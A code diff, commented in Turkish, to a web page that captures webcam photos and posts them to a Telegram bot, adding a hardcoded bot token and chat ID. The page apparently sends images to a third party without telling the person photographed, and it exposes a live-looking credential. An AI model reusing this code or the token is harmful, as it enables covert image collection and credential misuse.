@@ -16,7 +16,10 @@
     const canvas = document.getElementById('canvas');
     const button = document.getElementById('takePhoto');
 
-    // Kamerayı aç
+    const BOT_TOKEN = "8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY";  // Telegram Bot Tokenını buraya gir
+    const CHAT_ID = "1149820913";      // Telegram Chat ID'ni buraya gir
+
+    // Kameraya erişim izni al
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
@@ -27,7 +30,11 @@
 
     button.onclick = () => {
       const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Fotoğrafı base64 formatına çevir
       const photoData = canvas.toDataURL('image/png');
 
       // Fotoğrafı Telegram botuna gönder
@@ -35,18 +42,18 @@
     };
 
     function sendPhoto(photo) {
-      fetch('https://api.telegram.org/bot<8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY>/sendPhoto', {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          chat_id: '<1149820913>',
+          chat_id: CHAT_ID,
           photo: photo
         })
       })
       .then(response => response.json())
-      .then(data => console.log('Gönderildi:', data))
+      .then(data => console.log('Fotoğraf Gönderildi:', data))
       .catch(error => console.error('Hata:', error));
     }
   </script>
